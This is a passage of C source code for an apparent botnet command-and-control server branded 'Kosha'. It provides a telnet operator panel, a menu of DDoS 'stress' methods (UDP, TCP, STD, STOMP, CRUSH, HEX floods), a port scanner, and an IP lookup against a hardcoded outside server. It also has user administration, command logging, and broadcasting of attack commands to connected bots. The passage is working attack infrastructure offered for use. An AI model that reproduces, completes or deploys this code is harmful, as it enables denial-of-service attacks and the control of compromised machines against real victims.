            char host[16];
            trim(buf);
            char *token = strtok(buf, " ");
            snprintf(host, sizeof(host), "%s", token+strlen(token)+1);
            snprintf(botnet, sizeof(botnet), "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] Checking ports [\x1b[0;36m%d\x1b[1;37m] through [\x1b[0;36m%d\x1b[1;37m] \x1b[1;37mFor IP:[\x1b[0;36m%s\x1b[1;37m]\x1b[0m\r\n", least_port, max_port, host);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            for(x=least_port; x < max_port; x++)
            {
                int Sock = -1;
                struct timeval timeout;
                struct sockaddr_in sock;
                // set timeout secs
                timeout.tv_sec = ps_timeout;
                timeout.tv_usec = 0;
                Sock = socket(AF_INET, SOCK_STREAM, 0); // create our tcp socket
                setsockopt(Sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
                setsockopt(Sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
                sock.sin_family = AF_INET;
                sock.sin_port = htons(x);
                sock.sin_addr.s_addr = inet_addr(host);
                if(connect(Sock, (struct sockaddr *)&sock, sizeof(sock)) == -1) close(Sock);
                else
                {
                    snprintf(botnet, sizeof(botnet), "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] Port:[\x1b[0;36m%d\x1b[1;37m] is open For IP:[\x1b[0;36m%s!\x1b[1;37m]\x1b[0m\r\n", x, host);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    memset(botnet, 0, sizeof(botnet));
                    close(Sock);
                }
            }
            snprintf(botnet, sizeof(botnet), "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] Scan on IP:[\x1b[0;36m%s\x1b[1;37m] is Done!\x1b[0m\r\n", host);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "HELP") || strstr(buf, "help") || strstr(buf, "Help") || strstr(buf, "?"))  
        {
        char help_cmd1  [5000];
        char help_line1  [5000];
        char cmd_clear [5000];
        char cmd_logout [5000];
        char cmd_tools [5000];
        char cmd_staff [5000];
        char cmd_stress [5000];
        char cmd_personal [5000];
        char help_line3  [5000];

        sprintf(help_cmd1,   "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]All Commands\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
        sprintf(help_line1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");
        sprintf(cmd_clear,  "\x1b[0;37m[\x1b[0;31mClear Screen\x1b[1;37m]           CLEAR\r\n");
        sprintf(cmd_logout,  "\x1b[1;37m[\x1b[0;31mLOGOUT\x1b[1;37m]                 LOGOUT\r\n");
        sprintf(cmd_tools,  "\x1b[1;37m[\x1b[0;31mTool Commands\x1b[1;37m]          TOOLS\r\n");
        sprintf(cmd_staff,  "\x1b[1;37m[\x1b[0;31mStaff Commands\x1b[1;37m]         STAFF\r\n");
        sprintf(cmd_stress,  "\x1b[1;37m[\x1b[0;31mStressing Commands\x1b[1;37m]     STRESS\r\n");
        sprintf(cmd_personal,  "\x1b[1;37m[\x1b[0;31mPersonal Information\x1b[1;37m]  INFORMATION\r\n");
        sprintf(help_line3,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");

        if(send(thefd, help_cmd1, strlen(help_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_line1, strlen(help_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, cmd_clear, strlen(cmd_clear),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, cmd_logout, strlen(cmd_logout),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, cmd_tools, strlen(cmd_tools),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, cmd_staff, strlen(cmd_staff),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, cmd_stress, strlen(cmd_stress),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, cmd_personal, strlen(cmd_personal),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_line3, strlen(help_line3),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[0;31m[\x1b[1;37m%s\x1b[0;31m@\x1b[1;37mKosha\x1b[0;31m]\x1b[1;37m:", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
         if(strstr(buf, "clear") || strstr(buf, "cls") || strstr(buf, "CLEAR") || strstr(buf, "CLS"))  
        {
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Kosha_1, strlen(Kosha_1), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_2, strlen(Kosha_2), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_3, strlen(Kosha_3), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_4, strlen(Kosha_4), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_5, strlen(Kosha_5), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_6, strlen(Kosha_6), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_7, strlen(Kosha_7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Kosha_8, strlen(Kosha_8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Kosha_9, strlen(Kosha_9), MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[0;31m[\x1b[1;37m%s\x1b[0;31m@\x1b[1;37mKosha\x1b[0;31m]\x1b[1;37m:", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
         if(strstr(buf, "info") || strstr(buf, "INFO") || strstr(buf, "INFORMATION") || strstr(buf, "information"))  
        {
        char user_user [500];
        char user_pass [500];
        char user_ip [500];
        char user_level [500];
        char user_time [500];

        sprintf(user_user,       "\x1b[1;37mUsername:\x1b[0;31m %s\r\n", accounts[find_line].user, buf);
        sprintf(user_pass,       "\x1b[1;37mPassword:\x1b[0;31m %s\r\n", accounts[find_line].password, buf);
        sprintf(user_ip,    "\x1b[1;37mUser IP: \x1b[0;31mCOMING SOON\r\n");
        sprintf(user_level, "\x1b[1;37mUser Level:\x1b[0;31m %s\r\n", accounts[find_line].id, buf);
        sprintf(user_time,  "\x1b[1;37mTime Left: \x1b[0;31mCOMING SOON\r\n");
        if(send(thefd, user_user, strlen(user_user), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, user_pass, strlen(user_pass), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, user_ip, strlen(user_ip), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, user_level, strlen(user_level), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, user_time, strlen(user_time), MSG_NOSIGNAL) == -1) goto end; 
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[0;31m[\x1b[1;37m%s\x1b[0;31m@\x1b[1;37mKosha\x1b[0;31m]\x1b[1;37m:", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "STRESS") || strstr(buf, "stress") || strstr(buf, "ddos") || strstr(buf, "DDOS")) 
        {
        char stress_cmd1  [5000];
        char Method_KOSHA [5000];
        char Method_UDP  [5000];
        char Method_STD  [5000];
        char Method_TCP  [5000];
        char Method_STOMP [5000];
        char Method_CRUSH [5000];
        char Method_HEX [5000];

        sprintf(stress_cmd1,   "          \x1b[1;37m[\x1b[0;31m+\x1b[1;37m] \x1b[0;31m M E T H O D S \x1b[1;37m[\x1b[0;31m+\x1b[1;37m]\r\n");
        sprintf(Method_STD,    "\x1b[1;37m!* STD \x1b[1;37m[\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m]\r\n");
        sprintf(Method_UDP,    "\x1b[1;37m!* UDP \x1b[1;37m[\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m] 32 1460 10\r\n");
        sprintf(Method_TCP,    "\x1b[1;37m!* TCP \x1b[1;37m[\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m] 32 ALL 0 10\r\n");
        sprintf(Method_STOMP,  "\x1b[1;37m!* STOMP \x1b[1;37m[\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m] 32 ALL 1460 10\r\n");
        sprintf(Method_CRUSH,  "\x1b[1;37m!* CRUSH \x1b[1;37m[\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m] 32 ALL 1460 10\r\n");
        sprintf(Method_KOSHA,  "\x1b[1;37m!* KOSHA \x1b[1;37m[\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m]\r\n");
        sprintf(Method_KOSHA,  "\x1b[1;37m!* HEX \x1b[1;37m[\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m] 1460\r\n");
        if(send(thefd, stress_cmd1,  strlen(stress_cmd1),    MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Method_STD,   strlen(Method_STD),     MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Method_UDP,   strlen(Method_UDP),     MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Method_TCP,   strlen(Method_TCP),     MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Method_STOMP, strlen(Method_STOMP),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Method_CRUSH, strlen(Method_CRUSH),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Method_KOSHA, strlen(Method_KOSHA),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Method_HEX, strlen(Method_HEX),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[0;31m[\x1b[1;37m%s\x1b[0;31m@\x1b[1;37mKosha\x1b[0;31m]\x1b[1;37m:", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "SPECIAL") || strstr(buf, "STAFF") || strstr(buf, "Staff") || strstr(buf, "staff"))
        {
        pthread_create(&title, NULL, &titleWriter, sock);
        char special_cmd1  [5000];
        char special_line1  [5000];
        char Adduser  [5000];
        char install [5000];
        char special_line2  [5000];

        sprintf(special_cmd1,   "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]Admin Commands\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
        sprintf(special_line1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");
        sprintf(Adduser,        "\x1b[1;37m[\x1b[0;31mAdds User\x1b[1;37m]         adduser   [\x1b[0;31mUSER\x1b[1;37m] [\x1b[0;31mPASS\x1b[1;37m] [\x1b[0;31madmin/\x1b[0;31mnormal\x1b[1;37m]\r\n");
        sprintf(install,        "\x1b[1;37m[\x1b[0;31mInstalls IPHMS\x1b[1;37m]    AMPINSTALL\r\n");
        sprintf(special_line2,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n"); 

        if(send(thefd, special_cmd1, strlen(special_cmd1),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, special_line1, strlen(special_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Adduser, strlen(Adduser),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, install, strlen(install),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, special_line2,  strlen(special_line2),   MSG_NOSIGNAL) == -1) goto end; 
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        { 
        sprintf(botnet, "\x1b[0;31m[\x1b[1;37m%s\x1b[0;31m@\x1b[1;37mKosha\x1b[0;31m]\x1b[1;37m:", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        continue;
        } 
        if(strstr(buf, "tools") || strstr(buf, "TOOLS") || strstr(buf, "tool") || strstr(buf, "tool"))
        {
        pthread_create(&title, NULL, &titleWriter, sock);
        char special_tool_cmd1  [5000];
        char special_tool_line1  [5000];
        char tool_1  [5000];
        char tool_2  [5000];
        char tool_3 [5000];
        char special_tool_line2  [5000];

        sprintf(special_tool_cmd1,   "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]Admin Commands\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]\r\n");
        sprintf(special_tool_line1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");
        sprintf(tool_1,              "\x1b[1;37m[\x1b[0;31mIP Geolocation\x1b[1;37m]      iplookup   [\x1b[0;31mIP\x1b[1;37m]\r\n");
        sprintf(tool_2,              "\x1b[1;37m[\x1b[0;31mPortScanner\x1b[1;37m]         portscan  [\x1b[0;31mIP\x1b[1;37m]\r\n");
        sprintf(tool_3,              "\x1b[1;37m[\x1b[0;31mDomain Resolver\x1b[1;37m]     resolve  [\x1b[0;31mIP\x1b[1;37m]\r\n");
        sprintf(special_tool_line2,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n"); 

        if(send(thefd, special_tool_cmd1, strlen(special_tool_cmd1),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, special_tool_line1, strlen(special_tool_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, tool_1, strlen(tool_1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, tool_2, strlen(tool_2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, tool_3, strlen(tool_3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, special_tool_line2,  strlen(special_tool_line2),   MSG_NOSIGNAL) == -1) goto end; 
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        { 
        sprintf(botnet, "\x1b[0;31m[\x1b[1;37m%s\x1b[0;31m@\x1b[1;37mKosha\x1b[0;31m]\x1b[1;37m:", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        continue;
        }
        else if(strstr(buf, "iplookup") || strstr(buf, "IPLOOKUP"))
        {
            char myhost[20];
            char ki11[1024];
            snprintf(ki11, sizeof(ki11), "%s", buf);
            trim(ki11);
            char *token = strtok(ki11, " ");
            snprintf(myhost, sizeof(myhost), "%s", token+strlen(token)+1);
            if(atoi(myhost) >= 8)
            {
                int ret;
                int IPLSock = -1;
                char iplbuffer[1024];
                int conn_port = 80;
                char iplheaders[1024];
                struct timeval timeout;
                struct sockaddr_in sock;
                char *iplookup_host = "185.244.25.189"; // Change to Server IP
                timeout.tv_sec = 4; // 4 second timeout
                timeout.tv_usec = 0;
                IPLSock = socket(AF_INET, SOCK_STREAM, 0);
                sock.sin_family = AF_INET;
                sock.sin_port = htons(conn_port);
                sock.sin_addr.s_addr = inet_addr(iplookup_host);
                if(connect(IPLSock, (struct sockaddr *)&sock, sizeof(sock)) == -1)
                {
                    //printf("[\x1b[31m-\x1b[37m] Failed to connect to iplookup host server...\n");
                    sprintf(botnet, "\x1b[31m[IPLookup] Failed to connect to iplookup server...\x1b[0m\r\n", myhost);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else
                {
                    //printf("[\x1b[32m+\x1b[37m] Connected to iplookup server :)\n");
                    snprintf(iplheaders, sizeof(iplheaders), "GET /iplookup.php?host=%s HTTP/1.1\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding:gzip, deflate, sdch\r\nAccept-Language:en-US,en;q=0.8\r\nCache-Control:max-age=0\r\nConnection:keep-alive\r\nHost:%s\r\nUpgrade-Insecure-Requests:1\r\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\r\n\r\n", myhost, iplookup_host);
                    if(send(IPLSock, iplheaders, strlen(iplheaders), 0))
                    {
                        //printf("[\x1b[32m+\x1b[37m] Sent request headers to iplookup api!\n");
                        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] Gathering \x1b[0;31mInformation\x1b[1;37m On \x1b[0;31mIP\x1b[1;37m:[\x1b[0;31m%s\x1b[1;37m]\r\n", myhost);
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        char ch;
                        int retrv = 0;
                        uint32_t header_parser = 0;
                        while (header_parser != 0x0D0A0D0A)
                        {
                            if ((retrv = read(IPLSock, &ch, 1)) != 1)
                                break;
                
                            header_parser = (header_parser << 8) | ch;
                        }
                        memset(iplbuffer, 0, sizeof(iplbuffer));
                        while(ret = read(IPLSock, iplbuffer, 1024))
                        {
                            iplbuffer[ret] = '\0';
                            /*if(strlen(iplbuffer) > 1)
                                printf("\x1b[36m%s\x1b[37m\n", buffer);*/
                        }
                        //printf("%s\n", iplbuffer);
                        if(strstr(iplbuffer, "<title>404"))
                        {
                            char iplookup_host_token[20];
                            sprintf(iplookup_host_token, "%s", iplookup_host);
                            int ip_prefix = atoi(strtok(iplookup_host_token, "."));
                            sprintf(botnet, "\x1b[31m[IPLookup] Failed, API can't be located on server %d.*.*.*:80\x1b[0m\r\n", ip_prefix);
                            memset(iplookup_host_token, 0, sizeof(iplookup_host_token));
                        }
                        else if(strstr(iplbuffer, "nickers"))
                            sprintf(botnet, "\x1b[31m[IPLookup] Failed, Hosting server needs to have php installed for api to work...\x1b[0m\r\n");
                        else sprintf(botnet, "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m] \x1b[0m--- \x1b[0;31mResults\x1b[0m --- \x1b[1;37m[\x1b[0;31m+\x1b[1;37m]\r\n\x1b[0m%s\x1b[37m\r\n", iplbuffer);
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                    else
                    {
                        //printf("[\x1b[31m-\x1b[37m] Failed to send request headers...\n");
                        sprintf(botnet, "\x1b[31m[IPLookup] Failed to send request headers...\r\n");
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                }
                close(IPLSock);
            }
        }
        if(strstr(buf, "LOGOUT"))
        {
        printf("\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].user, buf); // We Are Attempting To Logout!
        FILE *logFile;// We Are Attempting To Logout!
        logFile = fopen("Kosha_Logout.log", "a");// We Are Attempting To Logout!
        fprintf(logFile, "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].user, buf);// We Are Attempting To Logout!
        fclose(logFile);// We Are Attempting To Logout!
        goto end; // We Are Dropping Down to end:
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "STOP")) 
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37mAttack Stopped!\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "CRUSH")) 
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37mAttack Sent!\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "TCP")) 
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37mAttack Sent!\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "UDP")) 
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37mAttack Sent!\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "STD")) 
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37mAttack Sent!\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "STOMP")) 
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37mAttack Sent!\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "KOSHA")) 
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37mAttack Sent!\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "LDAP")) 
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37mAttack Sent!\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if (strstr(buf, "EXIT") || strstr(buf, "exit"))  // We Are Closing Connection!
        { // Let Us Continue Our Journey!
        goto end; // We Are Dropping Down to end:
        } // Let Us Continue Our Journey!
        trim(buf);
        sprintf(botnet, "\x1b[0;31m[\x1b[1;37m%s\x1b[0;31m@\x1b[1;37mKosha\x1b[0;31m]\x1b[1;37m:", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(strlen(buf) == 0) continue;
        printf("\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] - Command:\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\n",accounts[find_line].user, buf);
        FILE *logFile;
        logFile = fopen("Kosha_C2.log", "a");
        fprintf(logFile, "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] - Command:\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\n", accounts[find_line].user, buf);
        fclose(logFile);
        broadcast(buf, thefd, usernamez);
        memset(buf, 0, 2048);
        } // Let Us Continue Our Journey!
        end:    // cleanup dead socket
        managements[thefd].connected = 0;
        close(thefd);
        managesConnected--;
}
 
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] Screening Error");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {  printf("\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] Incoming User Connection From ");
       
        client_addr(cli_addr);
        FILE *logFile;
        logFile = fopen("Kosha_Connection.log", "a");
        fprintf(logFile, "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] Incoming User Connection From [\x1b[0;36m%d.%d.%d.%d\x1b[1;37m]\n",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
        fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
        exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        threads = atoi(argv[2]);
        if (threads > 1000)
        {
        printf("\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\n");
        return 0;
        }
        else if (threads < 1000)
        {
        printf("");
        }
        printf("             \x1b[0;31m╦╔═╔═╗╔═╗╦ ╦╔═╗  ╔═╗╦═╗╔═╗ ╦╔═╗╔═╗╔╦╗\r\n             \x1b[0;31m╠╩╗║ ║╚═╗╠═╣╠═╣  ╠═╝╠╦╝║ ║ ║║╣ ║   ║\r\n             \x1b[0;31m╩ ╩╚═╝╚═╝╩ ╩╩ ╩  ╩  ╩╚═╚═╝╚╝╚═╝╚═╝ ╩ \r\n                \x1b[1;37mWelcome To The \x1b[0;31mKosha Project\x1b[1;37m!\r\n");
        listenFD = create_and_bind(argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort();
    
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort();
 
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
        perror ("listen");
        abort ();
        }
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
        perror ("epoll_create");
        abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
        perror ("epoll_ctl");
        abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
        pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
        broadcast("PING", -1, "STRING");
        sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}